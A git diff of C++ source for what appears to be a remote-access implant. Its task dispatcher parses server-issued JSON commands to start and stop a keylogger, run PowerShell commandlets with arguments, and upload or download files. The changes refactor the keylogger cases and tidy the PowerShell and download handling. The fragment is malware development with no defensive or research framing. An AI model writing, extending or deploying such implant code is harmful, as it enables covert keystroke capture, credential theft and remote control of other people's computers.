@@ -25,25 +25,22 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 
 	case KEYLOGGER_START:
 	{
-		Keylogger keylogger;
-		keylogger.keylog_start();
-		return CreateTaskRequest<Keylogger>(taskID, KEYLOGGER_START, NO_CODE, RUNNING, TaskSuccess{""});
+		return CreateTaskRequest<CommandKeylogger>(taskID, KEYLOGGER_START, NO_CODE, status, CommandKeylogger{});
 	}
 	break;
 
 	case KEYLOGGER_STOP:
 	{
-		Keylogger keylogger;
-		keylogger.keylog_stop();
-		std::string result = keylogger.get_keylog_data(taskID).data;
-		return CreateTaskRequest<Keylogger>(taskID, KEYLOGGER_STOP, NO_CODE, SUCCESS, TaskSuccess{result});
+		return CreateTaskRequest<CommandKeylogger>(taskID, KEYLOGGER_STOP, NO_CODE, status, CommandKeylogger{});
 	}
 	break;
 
 	case POWERSHELL:
+	{
 		auto cmd = node["Commandlet"].GetString();
 		auto arg = node["Arguements"].GetString();
 		return CreateTaskRequest<CommandPowershell>(taskID, type, code, status, CommandPowershell{cmd, arg});
+	}
 		break;
 
 	case UPLOAD:
@@ -57,7 +54,7 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 	}
 
 	// TODO : CHANGE TO USE CreateTaskRequest
-	case DOWNLOAD_CHUNK:
+	case DOWNLOAD:
 	{
 		if (code != DOWNLOAD ||
 			!node.HasMember("Path") ||
